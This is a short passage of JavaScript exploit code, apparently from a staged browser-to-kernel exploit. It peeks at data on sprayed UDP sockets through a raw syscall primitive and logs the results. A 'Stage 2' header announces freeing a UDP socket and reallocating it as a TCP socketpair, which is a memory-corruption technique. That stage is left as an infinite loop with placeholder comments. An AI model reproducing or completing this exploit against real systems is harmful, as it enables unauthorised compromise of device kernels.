        p.syscall("sys_recvfrom", spraySocketUDP[i], tag_packet, 0x4, MSG_DONTWAIT | MSG_PEEK);
        debug_log("read i = " + i.toString(16) + " | data = " + p.read4(tag_packet).toString(16));
    }

    /////////////////////////////////////////////////////////////////////
    // Stage 2 - free and reallocate one udp sock to tcp socketpair    //
    /////////////////////////////////////////////////////////////////////
    
    for(;;);

    /*
      Where i am?
      I am here
    */


    debug_log("We reached *the end*");
    debug_log("================================");
  } catch(ex) {
    alert(ex);
    debug_log("[ERROR] " + ex)
  }
}
